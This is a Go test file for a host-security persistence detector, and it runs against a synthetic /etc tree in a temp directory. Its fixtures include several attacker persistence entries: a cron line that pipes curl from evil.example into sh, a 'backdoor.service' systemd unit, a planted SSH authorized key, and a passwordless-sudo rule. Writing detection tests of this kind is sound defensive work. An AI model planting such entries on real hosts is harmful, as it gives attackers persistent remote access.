package hostsec

import (
	"os"
	"path/filepath"
	"testing"

	"vanguard/core/internal/database"
)

// newPersistenceRoot builds a minimal synthetic "/etc" tree under a tmpdir
// so PersistenceDetector (rooted via WithRoot) can be exercised without
// touching the real host filesystem.
func newPersistenceRoot(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	mustMkdirAll(t, filepath.Join(root, "etc", "cron.d"))
	mustMkdirAll(t, filepath.Join(root, "etc", "systemd", "system"))
	mustMkdirAll(t, filepath.Join(root, "etc", "profile.d"))
	mustMkdirAll(t, filepath.Join(root, "etc", "sudoers.d"))
	mustWriteFile(t, filepath.Join(root, "etc", "crontab"), "# system crontab\n17 *\t* * *\troot\tcd / && run-parts /etc/cron.hourly\n")
	mustWriteFile(t, filepath.Join(root, "etc", "passwd"), "root:x:0:0:root:/root:/bin/bash\n")
	mustWriteFile(t, filepath.Join(root, "etc", "sudoers"), "root ALL=(ALL:ALL) ALL\n")
	return root
}

func mustMkdirAll(t *testing.T, path string) {
	t.Helper()
	if err := os.MkdirAll(path, 0755); err != nil {
		t.Fatalf("mkdir %s: %v", path, err)
	}
}

func mustWriteFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatalf("write %s: %v", path, err)
	}
}

func TestPersistenceDetector_FirstScanIsSilent(t *testing.T) {
	db := testDB(t)
	rep := &fakeReporter{}
	root := newPersistenceRoot(t)

	d := NewPersistenceDetector(db, rep).WithRoot(root)
	d.Scan(bg())

	if len(rep.findings) != 0 {
		t.Fatalf("expected 0 findings on cold-start seeding scan, got %d: %+v", len(rep.findings), rep.findings)
	}
}

func TestPersistenceDetector_DetectsNewCronEntry(t *testing.T) {
	db := testDB(t)
	rep := &fakeReporter{}
	root := newPersistenceRoot(t)

	d := NewPersistenceDetector(db, rep).WithRoot(root)
	d.Scan(bg()) // seed

	// Append a new line to /etc/crontab -- a classic persistence technique.
	f, err := os.OpenFile(filepath.Join(root, "etc", "crontab"), os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		t.Fatalf("open for append: %v", err)
	}
	if _, err := f.WriteString("*/5 * * * * root curl http://evil.example/beacon.sh | sh\n"); err != nil {
		t.Fatalf("append: %v", err)
	}
	f.Close()

	rep.reset()
	d.Scan(bg())

	got := rep.byChange("new_cron_entry")
	if len(got) != 1 {
		t.Fatalf("expected exactly 1 'new_cron_entry' finding, got %d: %+v", len(got), rep.findings)
	}
	if got[0].Type != database.IncidentPersistenceDetected {
		t.Errorf("expected type %s, got %s", database.IncidentPersistenceDetected, got[0].Type)
	}

	// Re-scanning without further change must not re-fire.
	rep.reset()
	d.Scan(bg())
	if len(rep.findings) != 0 {
		t.Fatalf("expected 0 findings on stable re-scan, got %d: %+v", len(rep.findings), rep.findings)
	}
}

func TestPersistenceDetector_DetectsNewSystemdUnit(t *testing.T) {
	db := testDB(t)
	rep := &fakeReporter{}
	root := newPersistenceRoot(t)

	d := NewPersistenceDetector(db, rep).WithRoot(root)
	d.Scan(bg()) // seed

	mustWriteFile(t, filepath.Join(root, "etc", "systemd", "system", "backdoor.service"),
		"[Unit]\nDescription=totally legit\n[Service]\nExecStart=/tmp/.hidden/x\n")

	rep.reset()
	d.Scan(bg())

	got := rep.byChange("new_systemd_unit")
	if len(got) != 1 {
		t.Fatalf("expected exactly 1 'new_systemd_unit' finding, got %d: %+v", len(got), rep.findings)
	}
	if got[0].Subject != "backdoor.service" {
		t.Errorf("expected subject 'backdoor.service', got %q", got[0].Subject)
	}
}

func TestPersistenceDetector_DetectsNewAuthorizedKey(t *testing.T) {
	db := testDB(t)
	rep := &fakeReporter{}
	root := newPersistenceRoot(t)
	mustMkdirAll(t, filepath.Join(root, "root", ".ssh"))
	mustWriteFile(t, filepath.Join(root, "root", ".ssh", "authorized_keys"), "ssh-ed25519 AAAAoriginal admin@legit\n")

	d := NewPersistenceDetector(db, rep).WithRoot(root)
	d.Scan(bg()) // seed

	f, err := os.OpenFile(filepath.Join(root, "root", ".ssh", "authorized_keys"), os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		t.Fatalf("open for append: %v", err)
	}
	if _, err := f.WriteString("ssh-ed25519 AAAAplantedbackdoor attacker@evil\n"); err != nil {
		t.Fatalf("append: %v", err)
	}
	f.Close()

	rep.reset()
	d.Scan(bg())

	got := rep.byChange("new_authorized_keys_entry")
	if len(got) != 1 {
		t.Fatalf("expected exactly 1 'new_authorized_keys_entry' finding, got %d: %+v", len(got), rep.findings)
	}
}

func TestPersistenceDetector_DetectsDangerousSudoRuleLine(t *testing.T) {
	// scanSudoers itself just diffs lines like scanCron; the "dangerous"
	// classification lives in privesc.go. Here we just confirm a brand-new
	// sudoers line is reported as persistence-relevant at all.
	db := testDB(t)
	rep := &fakeReporter{}
	root := newPersistenceRoot(t)

	d := NewPersistenceDetector(db, rep).WithRoot(root)
	d.Scan(bg()) // seed

	f, err := os.OpenFile(filepath.Join(root, "etc", "sudoers"), os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		t.Fatalf("open for append: %v", err)
	}
	if _, err := f.WriteString("attacker ALL=(ALL) NOPASSWD: ALL\n"); err != nil {
		t.Fatalf("append: %v", err)
	}
	f.Close()

	rep.reset()
	d.Scan(bg())

	got := rep.byChange("new_sudoers_entry")
	if len(got) != 1 {
		t.Fatalf("expected exactly 1 'new_sudoers_entry' finding, got %d: %+v", len(got), rep.findings)
	}
}
